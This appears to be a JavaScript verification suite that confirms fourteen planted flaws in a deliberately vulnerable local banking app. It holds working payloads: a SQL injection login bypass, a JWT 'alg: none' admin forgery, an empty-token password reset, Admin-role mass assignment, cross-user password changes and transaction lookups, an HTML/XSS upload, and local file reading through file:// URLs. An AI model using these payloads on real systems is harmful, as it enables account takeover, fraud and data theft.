const axios = require('axios');
const fs = require('fs');
const path = require('path');

const BASE_URL = 'http://localhost:3000';

async function runTests() {
  console.log('--- STARTING VULNERABILITY VERIFICATION SUITE ---');
  let token = '';
  let customerId = '';
  let tempUserToken = '';
  let tempUserId = '';
  let normalUserEmail = 'rangga@geekswarrior.id';
  let adminEmail = 'admin@geekswarrior.id';

  // 1. SQL Injection Authentication Bypass on Login
  try {
    const sqliPayload = "admin@geekswarrior.id' --";
    const res = await axios.post(`${BASE_URL}/api/auth/login`, {
      email: sqliPayload,
      password: 'any_random_password'
    });
    if (res.data && res.data.token && res.data.user.role === 'Admin') {
      console.log('[+] Vulnerability Verified: SQL Injection Authentication Bypass (Logged in as Admin using SQL comment injection)');
    } else {
      console.log('[-] SQL Injection Authentication Bypass failed to login as Admin');
    }
  } catch (err) {
    console.error('[-] SQL Injection Auth Bypass test failed:', err.message);
  }

  // 2. Normal Login (to get valid token for subsequent tests)
  try {
    const res = await axios.post(`${BASE_URL}/api/auth/login`, {
      email: normalUserEmail,
      password: 'hunter2'
    });
    token = res.data.token;
    customerId = res.data.user.id;
    console.log('[+] Authentication successful for normal user:', normalUserEmail);
  } catch (err) {
    console.error('[-] Normal Authentication failed. Ensure server.js is running first.', err.message);
    process.exit(1);
  }

  // 3. No Rate Limit on Login (Credential Brute Force Check)
  try {
    let successCount = 0;
    for (let i = 0; i < 5; i++) {
      const res = await axios.post(`${BASE_URL}/api/auth/login`, {
        email: 'invalid_user@geekswarrior.id',
        password: 'wrong_password'
      }).catch(err => err.response);
      if (res && res.status === 401) {
        successCount++;
      }
    }
    if (successCount === 5) {
      console.log('[+] Vulnerability Verified: No rate limit on login (Sent 5 rapid login failures without block)');
    }
  } catch (err) {
    console.error('[-] Rate limiting test failed:', err.message);
  }

  // 4. Vulnerable Reset Password API (Bypassing validation with empty token)
  try {
    // Resetting Rangga's password using empty/null token
    const res = await axios.post(`${BASE_URL}/api/auth/reset-password`, {
      email: 'rangga@geekswarrior.id',
      token: '', // empty token
      newPassword: 'hunter2_new'
    });
    if (res.data && res.data.message.includes('successfully')) {
      console.log('[+] Vulnerability Verified: Reset Password bypass succeeded (empty token accepted)');
      
      // Revert password back to hunter2
      await axios.post(`${BASE_URL}/api/auth/reset-password`, {
        email: 'rangga@geekswarrior.id',
        token: '',
        newPassword: 'hunter2'
      });
    }
  } catch (err) {
    console.error('[-] Reset Password bypass test failed:', err.message);
  }

  // 5. JWT Privilege Escalation (none algorithm bypass)
  let adminToken = '';
  try {
    const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64').replace(/=/g, '');
    const payload = Buffer.from(JSON.stringify({ id: 1, email: 'admin@geekswarrior.id', role: 'Admin' })).toString('base64').replace(/=/g, '');
    adminToken = `${header}.${payload}.`;

    const res = await axios.get(`${BASE_URL}/api/admin/stats`, {
      headers: { 'Authorization': `Bearer ${adminToken}` }
    });
    if (res.status === 200 && res.data.totalDeposits !== undefined) {
      console.log('[+] Vulnerability Verified: JWT "none" algorithm privilege escalation succeeded (Accessed admin stats)');
    }
  } catch (err) {
    console.error('[-] JWT "none" test failed:', err.message);
  }

  // 6. Admin "+ New User" endpoint verification
  try {
    const newUserEmail = `testuser_${Date.now()}@geekswarrior.id`;
    const res = await axios.post(`${BASE_URL}/api/admin/users`, {
      name: 'Test New User',
      email: newUserEmail,
      password: 'password123',
      role: 'Customer',
      balance: 5000000
    }, {
      headers: { 'Authorization': `Bearer ${adminToken}` }
    });
    if (res.data && res.data.userId) {
      console.log('[+] Admin "+ New User" endpoint verified successfully');
      tempUserId = res.data.userId;
      
      const loginRes = await axios.post(`${BASE_URL}/api/auth/login`, {
        email: newUserEmail,
        password: 'password123'
      });
      tempUserToken = loginRes.data.token;
    }
  } catch (err) {
    console.error('[-] Admin "+ New User" test failed:', err.message);
  }

  // 7. Recipient validation on transfers (non-existent account rejects, existent succeeds)
  try {
    // Attempt transfer to non-existent account 99999999
    try {
      await axios.post(`${BASE_URL}/api/transfer`, {
        recipient: 'Ghost User',
        account: '99999999',
        amount: '10000',
        note: 'Transfer to non-existent account'
      }, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      console.log('[-] Recipient validation failed: transfer to non-existent account accepted');
    } catch (transferErr) {
      if (transferErr.response && transferErr.response.status === 400 && transferErr.response.data.error.includes('tidak ditemukan')) {
        console.log('[+] Recipient Validation Verified: Transfer to invalid account number was correctly rejected');
      } else {
        console.log('[-] Recipient validation failed with different response:', transferErr.message);
      }
    }

    // Transfer to valid account 54211188 (Sinta)
    const validRes = await axios.post(`${BASE_URL}/api/transfer`, {
      recipient: 'Sinta Maharani',
      account: '54211188',
      amount: '10000',
      note: 'Transfer to valid account'
    }, {
      headers: { 'Authorization': `Bearer ${token}` }
    });
    if (validRes.status === 200) {
      console.log('[+] Transfer to valid account number succeeded');
    }
  } catch (err) {
    console.error('[-] Recipient validation test failed:', err.message);
  }

  // 8. Insecure HTTP methods (PUT/DELETE) on transaction receipts
  try {
    // 1. Get first transaction ID
    const listRes = await axios.get(`${BASE_URL}/api/transactions`, {
      headers: { 'Authorization': `Bearer ${token}` }
    });
    if (listRes.data && listRes.data.length > 0) {
      const txId = listRes.data[0].id;
      
      // 2. Perform PUT request
      const putRes = await axios.put(`${BASE_URL}/api/transactions/${txId}`, {
        amount: -12345,
        note: 'Hacked note via PUT',
        recipient_name: 'Hacked Recipient'
      }, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      if (putRes.status === 200) {
        console.log('[+] Vulnerability Verified: PUT method allowed on transactions (Note modified)');
      }

      // 3. Perform DELETE request
      const deleteRes = await axios.delete(`${BASE_URL}/api/transactions/${txId}`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      if (deleteRes.status === 200) {
        console.log('[+] Vulnerability Verified: DELETE method allowed on transactions (Transaction deleted)');
      }
    } else {
      console.log('[-] No transactions available to test PUT/DELETE');
    }
  } catch (err) {
    console.error('[-] PUT/DELETE transactions test failed:', err.message);
  }

  // 9. Insecure File Upload (HTML payload allowed)
  try {
    const FormData = require('form-data');
    const form = new FormData();
    const htmlPayload = '<html><script>alert("XSS via uploaded HTML file")</script></html>';
    
    form.append('avatar', Buffer.from(htmlPayload), {
      filename: 'shell.html',
      contentType: 'text/html'
    });

    const res = await axios.post(`${BASE_URL}/api/upload`, form, {
      headers: {
        ...form.getHeaders(),
        'Authorization': `Bearer ${tempUserToken || token}`
      }
    });

    if (res.status === 200 && res.data.url.endsWith('.html')) {
      console.log('[+] Vulnerability Verified: Insecure File Upload (HTML file accepted at URL:', res.data.url, ')');
    } else {
      console.log('[-] Insecure File Upload test failed: HTML file was not accepted');
    }
  } catch (err) {
    console.error('[-] Insecure File Upload test failed:', err.message);
  }

  // 10. SSRF & RFI (LFI via file:// protocol)
  try {
    // LFI target: absolute path to package.json
    const packageJsonPath = path.resolve(__dirname, 'package.json');
    const lfiUrl = `file://${packageJsonPath.replace(/\\/g, '/')}`;

    const res = await axios.post(`${BASE_URL}/api/users/${tempUserId || customerId}/avatar`, {
      url: lfiUrl
    }, {
      headers: { 'Authorization': `Bearer ${tempUserToken || token}` }
    });

    if (res.data && res.data.avatar_url && res.data.avatar_url.startsWith('data:image/png;base64,')) {
      console.log('[+] Vulnerability Verified: Local File Inclusion (RFI) via file:// protocol succeeded (File content converted to Base64)');
    } else {
      console.log('[-] LFI / SSRF test failed');
    }
  } catch (err) {
    console.error('[-] SSRF/LFI test failed:', err.message);
  }

  // 11. BOLA & CSRF Change Password (GET parameter support)
  try {
    // Change password of Sinta Maharani (userId = 3) using Rangga's token (userId = 2)
    const targetUserId = 3;
    const newPass = 'sinta_hacked';
    const csrfUrl = `${BASE_URL}/api/users/change-password?userId=${targetUserId}&newPassword=${newPass}`;

    const res = await axios.get(csrfUrl, {
      headers: { 'Authorization': `Bearer ${token}` }
    });

    if (res.status === 200 && res.data.message.includes('successfully')) {
      console.log('[+] Vulnerability Verified: BOLA & CSRF password change succeeded (Changed user 3 password via GET)');
      
      // Revert Sinta's password
      await axios.get(`${BASE_URL}/api/users/change-password?userId=${targetUserId}&newPassword=s1nt4pass`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
    }
  } catch (err) {
    console.error('[-] BOLA/CSRF Change Password test failed:', err.message);
  }

  // 12. Public OpenAPI / Swagger Specifications
  try {
    const jsonRes = await axios.get(`${BASE_URL}/swagger.json`);
    const docsRes = await axios.get(`${BASE_URL}/api-docs`);

    if (jsonRes.status === 200 && jsonRes.data.swagger === '2.0' && docsRes.status === 200) {
      console.log('[+] Vulnerability Verified: Exposed OpenAPI specs (/swagger.json and /api-docs are public)');
    }
  } catch (err) {
    console.error('[-] OpenAPI specs exposure test failed:', err.message);
  }

  // 13. Register Mass Assignment privilege escalation
  try {
    const randomEmail = `admin_escalated_${Date.now()}@geekswarrior.id`;
    const res = await axios.post(`${BASE_URL}/api/auth/register`, {
      name: 'Escalated Admin',
      email: randomEmail,
      password: 'password123',
      role: 'Admin'
    });
    if (res.status === 200 && res.data.role === 'Admin') {
      console.log('[+] Vulnerability Verified: Register Mass Assignment (Successfully registered a user with Admin role)');
    } else {
      console.log('[-] Register Mass Assignment test failed: role not set to Admin');
    }
  } catch (err) {
    console.error('[-] Register Mass Assignment test failed:', err.message);
  }

  // 14. Transaction BOLA detail lookups (GET /api/transactions/{id})
  try {
    // We already have a valid user token (token) from user Rangga (userId = 1).
    // Let's query a transaction belonging to User B (Sinta) -> Netflix subscription (ID = 6)
    const targetTxId = 6;
    const res = await axios.get(`${BASE_URL}/api/transactions/${targetTxId}`, {
      headers: { 'Authorization': `Bearer ${token}` }
    });
    if (res.status === 200 && res.data.id === targetTxId && res.data.amount !== undefined) {
      console.log('[+] Vulnerability Verified: BOLA on GET /api/transactions/{id} (Normal user retrieved details of transaction ID 6)');
      console.log('    Response body properties:', {
        id: res.data.id,
        amount: res.data.amount,
        note: res.data.note
      });
    } else {
      console.log('[-] Transaction BOLA detail lookup test failed');
    }
  } catch (err) {
    console.error('[-] Transaction BOLA detail lookup test failed:', err.message);
  }

  console.log('--- VERIFICATION COMPLETED ---');
}

runTests();

